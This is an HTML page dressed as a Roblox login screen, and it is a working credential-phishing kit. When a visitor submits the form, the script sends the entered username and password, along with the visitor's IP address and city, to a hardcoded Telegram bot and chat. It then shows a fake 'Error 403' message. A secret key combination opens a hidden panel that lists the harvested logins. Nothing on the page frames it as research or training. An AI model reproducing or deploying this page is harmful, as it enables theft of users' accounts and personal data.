<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; font-family: "Segoe UI", sans-serif; background: radial-gradient(circle, #252729 0%, #000 100%); color: #d1d1d1; overflow: hidden; }
        .navbar { display: flex; align-items: center; background-color: #232527; padding: 0 20px; height: 40px; position: fixed; top: 0; width: 100%; z-index: 100; border-bottom: 1px solid #111; box-sizing: border-box; }
        .logo-text { font-size: 20px; font-weight: 800; color: #fff; }
        .screen { display: none; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; width: 100%; position: absolute; }
        #login-form-screen { display: flex; }
        .login-card { background-color: #232527; width: 420px; padding: 30px; border-radius: 4px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 12px; margin-bottom: 10px; background-color: #393b3d; border: 1px solid #393b3d; border-radius: 8px; color: #fff; outline: none; box-sizing: border-box; }
        input:focus { border-color: #ff0000; }
        .btn-auth { width: 100%; padding: 12px; background: #393b3d; border: 1px solid #fff; color: #fff; border-radius: 8px; cursor: pointer; font-weight: bold; }
        
        /* –°–ø–∏—Å–∫–∏ –∏ –ø–æ–∏—Å–∫ */
        .search-box { margin-bottom: 10px; display: none; }
        .acc-list { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; margin-top: 10px; width: 100%; max-height: 200px; overflow-y: auto; padding-right: 5px; }
        .acc-item { background: #333; padding: 6px; border-radius: 4px; cursor: pointer; border: 1px solid transparent; font-size: 12px; text-align: center; color: #aaa; }
        .acc-item:hover { border-color: #ff0000; color: #fff; }

        /* –ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å */
        .admin-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 95%; max-width: 1100px; border: 1px solid #444; max-height: 450px; overflow-y: auto; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th, td { padding: 8px; border: 1px solid #333; text-align: left; }
        #live-indicator { color: #00ff00; font-size: 11px; animation: pulse 0.5s infinite; font-weight: bold; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
    </style>
</head>
<body>

    <div class="navbar"><div class="logo-text">ROBLOX</div></div>

    <div id="login-form-screen" class="screen">
        <div class="login-card">
            <h2 style="color:#fff; margin-bottom: 20px;">Login to Roblox</h2>
            <input type="text" id="username" placeholder="Username">
            <input type="password" id="password" placeholder="Password">
            <button class="btn-auth" onclick="saveData()">Log In</button>
        </div>
    </div>

    <div id="admin-auth" class="screen">
        <div class="login-card" style="border: 2px solid #ff0000;">
            <h2 style="color: #ff0000; margin: 0 0 10px 0;">SECURITY</h2>
            <input type="password" id="admin_pass" placeholder="–ö–æ–¥ –∏–∑ TG">
            
            <div id="search-container" class="search-box">
                <input type="text" id="acc_search" placeholder="–ü–æ–∏—Å–∫ –∞–∫–∫–∞—É–Ω—Ç–∞..." oninput="filterAccounts()">
            </div>

            <div id="acc-selector" class="acc-list" style="display: none;"></div>
            
            <button id="request-btn" class="btn-auth" style="border-color: #ff0000; color: #ff0000; margin-top: 10px;" onclick="startVerification()">–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥ –∏ —Å–ø–∏—Å–æ–∫</button>
        </div>
    </div>

    <div id="admin-panel" class="screen">
        <div class="admin-box">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                <h2 style="color: #fff; margin: 0;">LOGS DATABASE</h2>
                <span id="live-indicator">‚óè LIVE</span>
            </div>
            <table>
                <thead><tr><th>User</th><th>Pass</th><th>IP Address</th><th>Time</th></tr></thead>
                <tbody id="logData"></tbody>
            </table>
        </div>
        <div style="margin-top: 15px;">
            <button class="btn-auth" style="width: 120px;" onclick="location.reload()">–í—ã—Ö–æ–¥</button>
            <button class="btn-auth" style="width: 150px; background: #440000;" onclick="clearLogs()">–û—á–∏—Å—Ç–∏—Ç—å</button>
        </div>
    </div>

    <script>
        const TG_TOKEN = "8385266015:AAHpN8EUWlEgoGtslfBoEoyqPycXD2gbPGw";
        const TG_CHAT_ID = "7863254073";
        let secretCode = "";
        let targetAccount = "";
        let lastLogsCount = -1;

        // –ì–µ–Ω–µ—Ä–∞—Ü–∏—è 90 –∞–∫–∫–∞—É–Ω—Ç–æ–≤
        const mockAccounts = [];
        const prefixes = ["Admin", "Mod", "User", "Dev", "Root", "Guest", "Tester", "Security", "Support", "Owner"];
        const suffixes = ["_X", "_Pro", "_Vip", "_Master", "01", "007", "_Global", "_Dev", "_Main", "_Debug"];
        
        for(let i=0; i<90; i++) {
            let name = prefixes[i % 10] + "_" + (100 + i) + suffixes[Math.floor(Math.random() * 10)];
            mockAccounts.push(name);
        }

        let keys = {};
        document.addEventListener('keydown', (e) => {
            keys[e.code] = true;
            if (keys["ControlLeft"] && keys["Backslash"] && keys["Digit3"] && keys["KeyZ"]) showScreen('admin-auth');
        });
        document.addEventListener('keyup', (e) => { delete keys[e.code]; });

        function showScreen(id) {
            document.querySelectorAll('.screen').forEach(s => s.style.display = 'none');
            document.getElementById(id).style.display = 'flex';
        }

        async function sendToTg(text) {
            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: "POST", headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: "Markdown" })
            });
        }

        async function startVerification() {
            secretCode = Math.floor(1000 + Math.random() * 9000).toString();
            targetAccount = mockAccounts[Math.floor(Math.random() * mockAccounts.length)];
            await sendToTg(`üîê *–í–•–û–î*\n–ö–æ–¥: \`${secretCode}\` \n–ù—É–∂–Ω—ã–π –∞–∫–∫: *${targetAccount}*`);
            
            document.getElementById('request-btn').style.display = "none";
            document.getElementById('search-container').style.display = "block";
            const accSelector = document.getElementById('acc-selector');
            accSelector.style.display = "grid";
            
            renderAccountList(mockAccounts);
        }

        function renderAccountList(list) {
            const accSelector = document.getElementById('acc-selector');
            accSelector.innerHTML = "";
            list.forEach(acc => {
                const div = document.createElement('div');
                div.className = 'acc-item';
                div.innerText = acc;
                div.onclick = async () => {
                    const enteredPass = document.getElementById('admin_pass').value;
                    if (enteredPass === secretCode && acc === targetAccount) {
                        showScreen('admin-panel');
                        setInterval(updateLogs, 10);
                    } else { alert("Access Denied"); location.reload(); }
                };
                accSelector.appendChild(div);
            });
        }

        function filterAccounts() {
            const query = document.getElementById('acc_search').value.toLowerCase();
            const filtered = mockAccounts.filter(a => a.toLowerCase().includes(query));
            renderAccountList(filtered);
        }

        async function getIP() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return data.ip ? (data.city ? `${data.ip} (${data.city})` : data.ip) : "Hidden";
            } catch (e) {
                try {
                    const resAlt = await fetch('https://api.ipify.org?format=json');
                    const dataAlt = await resAlt.json();
                    return dataAlt.ip;
                } catch(e2) { return "Hidden"; }
            }
        }

        async function saveData() {
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            if(!u || !p) return;
            const ipInfo = await getIP();
            await sendToTg(`üë§ *LOG*\nUser: \`${u}\` \nPass: \`${p}\` \nIP: \`${ipInfo}\``);
            let logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
            logs.push({ user: u, pass: p, ip: ipInfo, time: new Date().toLocaleTimeString() });
            localStorage.setItem('roblox_logs', JSON.stringify(logs));
            alert("Error 403: Forbidden");
        }

        function updateLogs() {
            const logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
            if (logs.length === lastLogsCount) return;
            const tbody = document.getElementById('logData');
            tbody.innerHTML = logs.length === 0 ? "<tr><td colspan='4' style='text-align:center'>–ü—É—Å—Ç–æ</td></tr>" : 
                logs.slice().reverse().map(l => `<tr><td>${l.user}</td><td>${l.pass}</td><td>${l.ip}</td><td>${l.time}</td></tr>`).join('');
            lastLogsCount = logs.length;
        }

        function clearLogs() {
            if (confirm("–£–¥–∞–ª–∏—Ç—å –≤—Å—ë?")) {
                localStorage.removeItem('roblox_logs');
                updateLogs();
            }
        }
    </script>
</body>
</html>
